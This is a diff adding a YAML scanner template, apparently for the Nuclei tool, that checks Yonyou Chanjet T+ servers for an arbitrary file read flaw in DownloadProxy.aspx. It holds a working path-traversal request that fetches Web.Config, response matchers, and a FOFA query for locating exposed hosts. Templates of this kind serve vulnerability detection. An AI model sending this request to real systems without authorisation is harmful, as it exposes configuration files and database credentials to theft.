@@ -1,0 +1,32 @@
+id: DownloadProxy_read
+info:
+  name: 用友 畅捷通T+ DownloadProxy_aspx_read
+  author: mike
+  severity: info
+  description: 用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件
+  reference: https://www.cnblogs.com/pursue-security/p/17684714.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="畅捷通-TPlus"
+http:
+  - raw:
+      - |
+        GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SYSTEMDB"
+          - "ProductInfo"
+          - "<?xml"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
